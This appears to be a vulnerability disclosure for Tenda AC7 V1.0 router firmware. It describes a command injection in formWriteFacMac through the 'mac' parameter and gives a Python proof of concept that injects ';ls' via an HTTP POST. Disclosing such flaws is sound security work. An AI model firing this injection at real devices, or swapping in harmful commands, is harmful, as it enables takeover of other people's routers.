## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2776.html

## Affected version

 AC7V1.0 V15.03.06.44

## Vulnerability details

In the Tenda AC7V1.0 V15.03.06.44 firmware, we discovered a command injection vulnerablility in `formWriteFacMac` function in the `mac` parameter and the `mac` varable is directly passed to a `doSystemCmd` function, causing an arbitrary command execution. The user-provided `mac` can trigger this security vulnerability.

![image-20240318142324413](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318142324413.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/WriteFacMac"
payload = ";ls"

data = {"mac": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240313164800839](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313164800839.png)
